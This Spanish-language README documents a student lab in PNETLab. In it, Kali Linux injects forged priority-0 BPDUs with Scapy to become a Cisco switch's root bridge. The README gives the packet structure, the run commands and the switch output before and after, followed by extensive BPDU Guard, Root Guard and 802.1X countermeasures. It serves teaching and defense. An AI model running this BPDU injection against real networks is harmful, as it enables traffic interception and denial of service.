# 🔒 STP Root Bridge Attack Laboratory

<div align="center">

![PNETLab](https://img.shields.io/badge/Platform-PNETLab-blue?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.x-yellow?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.x-red?style=for-the-badge)
![Cisco](https://img.shields.io/badge/Cisco-IOS-1BA0D7?style=for-the-badge&logo=cisco)

**Demostración práctica de ataque de manipulación de topología STP (Spanning Tree Protocol)**

[Descripción](#-descripción) •
[Topología](#-topología-de-red) •
[Requisitos](#-requisitos-previos) •
[Metodología](#-metodología-del-ataque) •
[Resultados](#-análisis-de-resultados) •
[Mitigación](#-contramedidas-y-mitigación)

</div>

---

## 📋 Descripción

Este laboratorio demuestra un ataque de **manipulación de topología STP** mediante la inyección de BPDUs (Bridge Protocol Data Units) maliciosas. El objetivo es forzar a un switch Cisco a reconocer una máquina atacante (Kali Linux) como el nuevo **Root Bridge** de la red, permitiendo potencialmente la interceptación de tráfico (Man-in-the-Middle).

### 🎯 Objetivos del Laboratorio

- Comprender el funcionamiento del protocolo Spanning Tree (STP)
- Explotar vulnerabilidades en redes sin protección BPDU Guard
- Demostrar el impacto de convertirse en Root Bridge malicioso
- Implementar y validar contramedidas de seguridad

### ⚠️ Advertencia Legal

> **IMPORTANTE:** Este laboratorio es únicamente para fines educativos en entornos controlados. El uso de estas técnicas en redes de producción sin autorización expresa es ilegal y no ético.

---

## 🏗️ Topología de Red

La topología del laboratorio incluye:

```
                    ┌─────────┐
                    │   Net   │
                    │ (Cloud) │
                    └────┬────┘
                         │ Gi0/0
                    ┌────┴────┐
                    │  vIOS   │◄─── Router 1
                    │ Router  │
                    └────┬────┘
                         │ Gi0/1
                    ┌────┴────┐
                    │  vIOS   │◄─── Router 2
                    │ Router  │
                    └────┬────┘
                         │ Gi0/0
                    ┌────┴────┐
                    │ Switch  │◄─── Switch Central
               ┌────┤  Cisco  ├────┐
        Gi0/1  │    │  vIOS   │    │  Gi0/2
               │    └─────────┘    │
               │         │ Gi0/3   │
          ┌────┴────┐    │    ┌────┴────┐
          │  Linux  │    │    │   Win   │
          │  (e0)   │    │    │  (e0)   │
          └─────────┘    │    └─────────┘
                    ┌────┴────┐
                    │  Kali   │◄─── Atacante
                    │ (eth0)  │
                    └─────────┘
```


<img width="1400" height="841" alt="image" src="https://github.com/user-attachments/assets/f872c0a6-703f-4431-98ff-e03b008168d0" />

### 📊 Detalles de la Topología

| Dispositivo | Tipo | Interfaz | Dirección IP | Rol |
|-------------|------|----------|--------------|-----|
| **Switch Central** | Cisco vIOS | Gi0/0-3, Gi1/0-3 | - | Víctima / Root Bridge Original |
| **Kali Linux** | Atacante | eth0 | 20.24.116.2/24 | Atacante Root Bridge |
| **Linux** | Host | e0 | - | Cliente de prueba |
| **Windows** | Host | e0 | - | Cliente de prueba |
| **Router 1** | vIOS | Gi0/0-1 | - | Infraestructura |
| **Router 2** | vIOS | Gi0/0 | - | Infraestructura |

---

## 🛠️ Requisitos Previos

### Hardware Virtual
- **Plataforma:** PNETLab
- **Memoria:** Mínimo 8GB RAM
- **CPU:** 4 cores recomendados

### Software
- **Sistema Operativo Atacante:** Kali Linux (2023.x o superior)
- **Switch:** Cisco IOS vIOS (compatible con STP/RSTP)
- **Python:** 3.8 o superior
- **Librerías Python:**
  ```bash
  sudo apt update
  sudo apt install python3-scapy
  ```

### Configuración Inicial del Switch

```cisco
SW-PRACTICA# show running-config
!
spanning-tree mode pvst
spanning-tree extend system-id
!
interface range GigabitEthernet0/0-3
 switchport mode access
 switchport access vlan 1
 no spanning-tree bpduguard enable  ! CRÍTICO: BPDU Guard desactivado
!
```

---

## 🚀 Metodología del Ataque

### Fase 1: Reconocimiento Inicial

**Estado de STP antes del ataque:**

```bash
SW-PRACTICA# show spanning-tree

VLAN0001
  Spanning tree enabled protocol rstp
  Root ID    Priority    32769
             Address     50b3.fc00.0900
             This bridge is the root
             Hello Time  2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32769  (priority 32768 sys-id-ext 1)
             Address     50b3.fc00.0900
             Hello Time  2 sec  Max Age 20 sec  Forward Delay 15 sec
             Aging Time  300 sec

Interface           Role Sts Cost      Prio.Nbr Type
------------------- ---- --- --------- -------- ----
Gi0/0               Desg FWD 4         128.1    Shr Edge
Gi0/1               Desg FWD 4         128.2    Shr Edge
Gi0/2               Desg FWD 4         128.3    Shr Edge
Gi0/3               Desg FWD 4         128.4    Shr Edge
Gi1/0               Desg FWD 4         128.5    Shr
Gi1/1               Desg FWD 4         128.6    Shr
Gi1/2               Desg FWD 4         128.7    Shr
Gi1/3               Desg FWD 4         128.8    Shr
```
<img width="944" height="806" alt="image" src="https://github.com/user-attachments/assets/1e7dc8ae-a8c1-4cfd-9ebe-2ab09a2e2617" />


**Información clave capturada:**
- ✅ Root Bridge Priority: **32769**
- ✅ Root MAC Address: **50:b3:fc:00:09:00**
- ✅ Mensaje: **"This bridge is the root"**



### Fase 2: Ejecución del Ataque

```bash
root@kali:~# sudo python3 STP_Root.py

╔═══════════════════════════════════════════════════════╗
║           STP ROOT BRIDGE ATTACK - PNETLab           ║
║                   Scapy Edition                       ║
╚═══════════════════════════════════════════════════════╝

[+] Interfaz: eth0
[+] MAC Atacante: 50:46:95:00:0a:00
[*] Fingiendo ser el Root Bridge con MAC: 50:46:95:00:0a:00
[*] BPDU de prioridad 0 enviada. Manteniendo el control...

[*] Lanzando STP Claim Root Attack...
[+] BPDU de prioridad 0 enviada. Manteniendo el control... (Paquetes: 10)
[+] BPDU de prioridad 0 enviada. Manteniendo el control... (Paquetes: 20)
[+] BPDU de prioridad 0 enviada. Manteniendo el control... (Paquetes: 30)
...
```
<img width="955" height="707" alt="image" src="https://github.com/user-attachments/assets/08a49b25-e11b-45c2-8487-ee26788622ea" />

---

## 📊 Análisis de Resultados

### Comparativa: Antes vs Después del Ataque

#### ❌ Estado ANTES del Ataque

| Parámetro | Valor |
|-----------|-------|
| **Root Priority** | 32769 |
| **Root MAC** | 50:b3:fc:00:09:00 |
| **Root Status** | "This bridge is the root" |
| **Gi0/1 Role** | Designated (Desg) |
| **Gi0/1 Status** | Forwarding (FWD) |
| **Control de Topología** | Switch Cisco |

#### ✅ Estado DESPUÉS del Ataque

```bash
SW-PRACTICA# show spanning-tree

VLAN0001
  Spanning tree enabled protocol rstp
  Root ID    Priority    0              ◄─── PRIORIDAD CAMBIADA A 0
             Address     5046.9500.0a00 ◄─── MAC DEL KALI LINUX
             Cost        4
             Port        2 (GigabitEthernet0/1)
             Hello Time  2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32769  (priority 32768 sys-id-ext 1)
             Address     50b3.fc00.0900
             Hello Time  2 sec  Max Age 20 sec  Forward Delay 15 sec
             Aging Time  300 sec

Interface           Role Sts Cost      Prio.Nbr Type
------------------- ---- --- --------- -------- ----
Gi0/0               Desg FWD 4         128.1    Shr Edge
Gi0/1               Root FWD 4         128.2    Shr Peer(STP) ◄─── CAMBIÓ A ROOT
Gi0/2               Desg FWD 4         128.3    Shr Edge
Gi0/3               Desg FWD 4         128.4    Shr Edge
```

<img width="1189" height="499" alt="image" src="https://github.com/user-attachments/assets/5c7de539-bc44-44c6-81dc-7ff6c327f1f7" />




| Parámetro | Valor |
|-----------|-------|
| **Root Priority** | **0** ✨ |
| **Root MAC** | **50:46:95:00:0a:00** (Kali) ✨ |
| **Root Status** | Switch ya NO es root |
| **Gi0/1 Role** | **Root** ✨ |
| **Gi0/1 Status** | Forwarding (FWD) |
| **Control de Topología** | **Kali Linux (Atacante)** ✨ |



```bash
SW-PRACTICA# show spanning-tree root

                                        Root    Hello Max Fwd
Vlan                   Root ID          Cost    Time  Age Dly  Root Port
---------------- -------------------- --------- ----- --- ---  ------------
VLAN0001         0     5046.9500.0a00         4     2  20  15  Gi0/1
```

<img width="1192" height="212" alt="image" src="https://github.com/user-attachments/assets/ab5a8595-7a97-4b20-b154-84872af41a49" />


### 🔍 Información Extraída del Atacante

**Captura desde Kali Linux:**

| Dato | Valor |
|------|-------|
| **Root Bridge actual** | Priority: 32769, MAC: 50:b3:fc:00:09:00 |
| **Tu MAC (Kali)** | 50:46:95:00:0a:00 |
| **Tu IP (Kali)** | 20.24.116.2/24 |
| **Interfaz** | eth0 |
| **VLAN** | VLAN 1 (default) |
| **Protocolo STP** | RSTP (Rapid Spanning Tree) |

---

## ⚠️ Impacto del Ataque

### 1. **Manipulación de la Topología de Red**
Al convertirse en Root Bridge, el atacante redefine la topología de Spanning Tree, forzando que ciertos caminos de red pasen a través de su dispositivo.

### 2. **Posibilidad de Man-in-the-Middle (MitM)**
Todo el tráfico de la red puede ser redirigido a través del atacante, permitiendo:
- 📡 Interceptación de tráfico
- 🔓 Captura de credenciales
- 🕵️ Espionaje de comunicaciones
- 🎭 Modificación de paquetes en tránsito

### 3. **Denegación de Servicio (DoS)**
- Inestabilidad en la red por cambios constantes de topología
- Posible caída de servicios críticos
- Tormenta de broadcasts

### 4. **Violación de Políticas de Seguridad**
- Bypass de controles de acceso basados en topología
- Evasión de sistemas de monitoreo de red

---

## 🛡️ Contramedidas y Mitigación

### 1. **BPDU Guard (CRÍTICO)**

**Configuración recomendada:**

```cisco
SW-PRACTICA(config)# interface range GigabitEthernet0/1-3
SW-PRACTICA(config-if-range)# spanning-tree bpduguard enable
SW-PRACTICA(config-if-range)# exit

! Habilitar BPDU Guard globalmente en todos los puertos PortFast
SW-PRACTICA(config)# spanning-tree portfast bpduguard default
```

**Resultado:**
Si se recibe una BPDU en un puerto con BPDU Guard, el puerto se apaga automáticamente (err-disabled).

### 2. **Root Guard**

```cisco
SW-PRACTICA(config)# interface range GigabitEthernet0/1-3
SW-PRACTICA(config-if-range)# spanning-tree guard root
```

Previene que puertos no autorizados se conviertan en Root Port.

### 3. **Port Security**

```cisco
SW-PRACTICA(config)# interface GigabitEthernet0/1
SW-PRACTICA(config-if)# switchport port-security
SW-PRACTICA(config-if)# switchport port-security maximum 2
SW-PRACTICA(config-if)# switchport port-security violation shutdown
SW-PRACTICA(config-if)# switchport port-security mac-address sticky
```

### 4. **DHCP Snooping y DAI (Dynamic ARP Inspection)**

```cisco
SW-PRACTICA(config)# ip dhcp snooping
SW-PRACTICA(config)# ip dhcp snooping vlan 1
SW-PRACTICA(config)# interface range GigabitEthernet0/1-3
SW-PRACTICA(config-if-range)# ip dhcp snooping limit rate 10
SW-PRACTICA(config-if-range)# ip arp inspection limit rate 10
```

### 5. **Autenticación 802.1X**

```cisco
SW-PRACTICA(config)# aaa new-model
SW-PRACTICA(config)# dot1x system-auth-control
SW-PRACTICA(config)# interface range GigabitEthernet0/1-3
SW-PRACTICA(config-if-range)# authentication port-control auto
SW-PRACTICA(config-if-range)# dot1x pae authenticator
```

### 6. **Monitoreo y Logging**

```cisco
SW-PRACTICA(config)# logging buffered 51200 informational
SW-PRACTICA(config)# logging trap informational
SW-PRACTICA(config)# logging source-interface Vlan1
SW-PRACTICA(config)# logging host 192.168.1.100

! Habilitar SNMP traps para STP
SW-PRACTICA(config)# snmp-server enable traps bridge topologychange
SW-PRACTICA(config)# snmp-server enable traps stpx inconsistency
```

### 7. **Tabla Resumen de Contramedidas**

| Contramedida | Función | Nivel de Protección | Configuración Crítica |
|--------------|---------|---------------------|----------------------|
| **BPDU Guard** | Deshabilita puerto al recibir BPDU | ⭐⭐⭐⭐⭐ | `spanning-tree bpduguard enable` |
| **Root Guard** | Previene puertos no autorizados como root | ⭐⭐⭐⭐ | `spanning-tree guard root` |
| **Port Security** | Limita MACs por puerto | ⭐⭐⭐⭐ | `switchport port-security` |
| **802.1X** | Autenticación de dispositivos | ⭐⭐⭐⭐⭐ | `dot1x pae authenticator` |
| **DHCP Snooping** | Previene ataques DHCP | ⭐⭐⭐ | `ip dhcp snooping` |
| **Logging/SNMP** | Monitoreo y alertas | ⭐⭐⭐ | `logging host` |

---


---

## 🎓 Fundamentos Teóricos de STP

### ¿Qué es Spanning Tree Protocol (STP)?

STP (IEEE 802.1D) es un protocolo de red de capa 2 diseñado para prevenir bucles en topologías de red con enlaces redundantes. El protocolo:

1. **Elige un Root Bridge** - El switch con la menor prioridad
2. **Calcula el camino más corto** - Hacia el Root Bridge
3. **Bloquea puertos redundantes** - Para prevenir bucles

### Proceso de Elección del Root Bridge

```
Priority + Extended System ID (VLAN) + MAC Address
    ↓
Menor valor = Root Bridge
    ↓
Ejemplo:
- Switch A: 32768 + 1 + 00:00:00:00:00:01 = 32769.0000.0000.0001
- Switch B: 0 + 1 + 50:46:95:00:0a:00 = 1.5046.9500.0a00 ← GANA
```

### Tipos de BPDUs

1. **Configuration BPDU** - Usado en STP normal (cada 2 segundos)
2. **TCN BPDU** - Notificación de cambio de topología
3. **RSTP BPDU** - Usado en Rapid STP

---

## 🔬 Análisis Técnico Detallado

### Estructura de una BPDU Maliciosa

```python
# Capa 2: Ethernet 802.3
Dot3(
    dst="01:80:c2:00:00:00",      # Multicast STP
    src="50:46:95:00:0a:00"       # MAC del atacante
)

# Capa LLC (Logical Link Control)
LLC(
    dsap=0x42,                     # Destination SAP
    ssap=0x42,                     # Source SAP
    ctrl=0x03                      # Control field
)

# BPDU de Configuración
STP(
    rootid=0,                      # ⚠️ Prioridad 0 (máxima)
    rootmac="50:46:95:00:0a:00",  # ⚠️ MAC del atacante
    bridgeid=0,                    # ⚠️ Prioridad 0 (máxima)
    bridgemac="50:46:95:00:0a:00",# ⚠️ MAC del atacante
    portid=0x8001,
    age=1,
    maxage=20,
    hellotime=2,
    fwddelay=15
)
```

### Flujo del Ataque

```
┌─────────────────────────────────────────────────────────────┐
│ 1. RECONOCIMIENTO                                           │
│    - Identificar Root Bridge actual                         │
│    - Capturar BPDUs legítimas                              │
│    - Obtener información de topología                       │
└─────────────────────┬───────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. PREPARACIÓN                                              │
│    - Configurar interfaz en modo promiscuo                  │
│    - Preparar script de Scapy                              │
│    - Calcular prioridad inferior a Root actual              │
└─────────────────────┬───────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. INYECCIÓN DE BPDUs                                       │
│    - Enviar BPDUs con Priority 0                           │
│    - Mantener transmisión cada 2 segundos                   │
│    - Switch legítimo detecta "mejor" Root Bridge            │
└─────────────────────┬───────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. RECONFIGURACIÓN DE TOPOLOGÍA                            │
│    - Switch cambia Root Bridge                              │
│    - Puerto atacante se convierte en Root Port              │
│    - Tráfico es redirigido a través del atacante           │
└─────────────────────┬───────────────────────────────────────┘
                      ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. EXPLOTACIÓN                                              │
│    - Interceptación de tráfico (Man-in-the-Middle)         │
│    - Análisis de paquetes                                   │
│    - Posible modificación de datos                          │
└─────────────────────────────────────────────────────────────┘
```

---





## 🧪 Guía de Laboratorio Paso a Paso

### Paso 1: Preparación del Entorno PNETLab

1. **Importar imagen de Kali Linux:**
   ```bash
   # En el servidor PNETLab
   cd /opt/unetlab/addons/qemu/
   wget [URL_de_Kali_Linux_imagen]
   /opt/unetlab/wrappers/unl_wrapper -a fixpermissions
   ```

2. **Crear topología en PNETLab:**
   - Agregar dispositivos según el diagrama
   - Conectar interfaces
   - Iniciar todos los nodos

### Paso 2: Configuración Inicial del Switch

```cisco
Switch> enable
Switch# configure terminal
Switch(config)# hostname SW-PRACTICA
SW-PRACTICA(config)# 
SW-PRACTICA(config)# vlan 1
SW-PRACTICA(config-vlan)# name LABORATORIO
SW-PRACTICA(config-vlan)# exit
SW-PRACTICA(config)# 
SW-PRACTICA(config)# interface range GigabitEthernet0/0-3
SW-PRACTICA(config-if-range)# switchport mode access
SW-PRACTICA(config-if-range)# switchport access vlan 1
SW-PRACTICA(config-if-range)# no shutdown
SW-PRACTICA(config-if-range)# exit
SW-PRACTICA(config)# 
SW-PRACTICA(config)# spanning-tree mode rapid-pvst
SW-PRACTICA(config)# end
SW-PRACTICA# write memory
```

### Paso 3: Verificación Inicial

```cisco
SW-PRACTICA# show spanning-tree

VLAN0001
  Spanning tree enabled protocol rstp
  Root ID    Priority    32769
             Address     50b3.fc00.0900
             This bridge is the root ← IMPORTANTE
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
```

### Paso 4: Configuración de Kali Linux

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Scapy
sudo apt install python3-scapy -y

# Verificar interfaz de red
ip addr show eth0

# Habilitar modo promiscuo (opcional)
sudo ip link set eth0 promisc on

# Descargar script
wget https://raw.githubusercontent.com/tu-usuario/STP-Attack/main/scripts/STP_Root.py

# Dar permisos de ejecución
chmod +x STP_Root.py
```

### Paso 5: Ejecutar el Ataque

```bash
# Ejecutar como root
sudo python3 STP_Root.py

# Alternativamente, ejecutar en segundo plano
sudo nohup python3 STP_Root.py &
```

### Paso 6: Verificación del Ataque

```cisco
SW-PRACTICA# show spanning-tree

VLAN0001
  Spanning tree enabled protocol rstp
  Root ID    Priority    0          ← CAMBIÓ A 0
             Address     5046.9500.0a00  ← MAC DE KALI
             Cost        4
             Port        2 (GigabitEthernet0/1)
             Hello Time   2 sec  Max Age 20 sec  Forward Delay 15 sec
```

### Paso 7: Análisis de Tráfico (Opcional)

```bash
# En Kali Linux, capturar tráfico
sudo tcpdump -i eth0 -w captura_stp.pcap

# O usar Wireshark
sudo wireshark &
```

### Paso 8: Limpieza y Restauración

```cisco
# Detener el script en Kali (Ctrl+C)

# En el switch, esperar a que STP reconverga
SW-PRACTICA# show spanning-tree

# Implementar contramedidas
SW-PRACTICA# configure terminal
SW-PRACTICA(config)# interface GigabitEthernet0/1
SW-PRACTICA(config-if)# spanning-tree bpduguard enable
SW-PRACTICA(config-if)# end
```

---

## 🎯 Escenarios de Práctica Adicionales

### Escenario 1: Root Guard vs BPDU Guard

**Objetivo:** Comparar el comportamiento de ambas protecciones

**Procedimiento:**
1. Activar Root Guard en puerto Gi0/1
2. Ejecutar ataque
3. Observar que el puerto bloquea pero NO se deshabilita
4. Cambiar a BPDU Guard
5. Ejecutar ataque
6. Observar que el puerto entra en estado err-disabled

### Escenario 2: Ataque con Priority Incrementada

**Objetivo:** Demostrar que no siempre se necesita priority 0

**Modificación del script:**
```python
# En lugar de priority 0
stp = STP(
    rootid=16384,  # Priority más baja que 32769 pero no la mínima
    # ... resto igual
)
```

### Escenario 3: Múltiples Atacantes

**Objetivo:** Simular competencia entre atacantes

**Configuración:**
- Dos máquinas Kali ejecutando el script
- Observar comportamiento de STP
- Analizar qué MAC gana

---

## 📚 Recursos Adicionales


### Libros Recomendados

1. **"Network Security Assessment"** - Chris McNab
2. **"CCNA Security Official Cert Guide"** - Omar Santos
3. **"Hacking Exposed: Network Security Secrets & Solutions"** - Stuart McClure

### Herramientas Relacionadas

- **Yersinia** - Framework para ataques de capa 2
- **Ettercap** - Suite para MitM
- **Wireshark** - Análisis de protocolos
- **GNS3/EVE-NG** - Alternativas a PNETLab



---

---

## 🔐 Consideraciones Éticas y Legales

### Disclaimer Legal

> **⚠️ ADVERTENCIA IMPORTANTE:**
> 
> Este laboratorio está diseñado EXCLUSIVAMENTE para:
> - Entornos de laboratorio aislados
> - Propósitos educativos
> - Investigación de seguridad autorizada
> - Preparación para certificaciones de seguridad (CEH, OSCP, etc.)
> 
> **NUNCA** uses estas técnicas en:
> - Redes de producción sin autorización escrita
> - Infraestructura de terceros
> - Redes públicas o compartidas
> - Cualquier entorno donde no tengas permiso explícito

### Marco Ético del Hacking

1. **Obtén autorización por escrito** antes de cualquier prueba
2. **Define el alcance** de las pruebas
3. **Documenta todo** lo que hagas
4. **Reporta vulnerabilidades** de manera responsable
5. **No causes daño** intencionalmente
6. **Mantén la confidencialidad** de la información descubierta

### Certificaciones Recomendadas

- **CEH (Certified Ethical Hacker)** - EC-Council
- **OSCP (Offensive Security Certified Professional)** - Offensive Security
- **CCNA Security** - Cisco
- **CompTIA Security+** - CompTIA

---


---

## 📝 Changelog

### Versión 1.0.0 (Febrero 2026)
- ✅ Lanzamiento inicial del laboratorio
- ✅ Script de ataque STP con Scapy
- ✅ Documentación completa en español
- ✅ Capturas de pantalla del proceso
- ✅ Guía de contramedidas

### Versión 0.9.0 (Enero 2026)
- 🔨 Desarrollo del script de ataque
- 🔨 Pruebas en PNETLab
- 🔨 Documentación preliminar

---



### Autor

Maitte Rodriguez
Estudiante de seguridad informatica
---

## 📄 Licencia

Este proyecto está licenciado bajo la **MIT License** - ver el archivo [LICENSE](LICENSE) para más detalles.

```
MIT License

Copyright (c) 2026  Maitte Rodriguez

Se concede permiso, de forma gratuita, a cualquier persona que obtenga una copia
de este software y archivos de documentación asociados (el "Software"), para usar
el Software sin restricciones, incluyendo sin limitación los derechos de usar,
copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender copias
del Software, sujeto a las siguientes condiciones:

El aviso de copyright anterior y este aviso de permiso se incluirán en todas las
copias o porciones sustanciales del Software.

EL SOFTWARE SE PROPORCIONA "TAL CUAL", SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O
IMPLÍCITA, INCLUYENDO PERO NO LIMITADO A LAS GARANTÍAS DE COMERCIABILIDAD,
IDONEIDAD PARA UN PROPÓSITO PARTICULAR Y NO INFRACCIÓN.
```

---

## 🌟 Agradecimientos

- **Anthropic** - Por proporcionar Claude como herramienta de asistencia
- **PNETLab Team** - Por la excelente plataforma de laboratorio
- **Scapy Community** - Por la increíble librería de manipulación de paquetes
- **Cisco** - Por la documentación técnica de STP
- **Comunidad de InfoSec** - Por compartir conocimiento abiertamente

---


---

<div align="center">

### 🛡️ Recuerda: Con gran poder viene gran responsabilidad

**Usa este conocimiento éticamente y solo en entornos autorizados**

---

---

Hecho con ❤️ para la comunidad de ciberseguridad

</div>
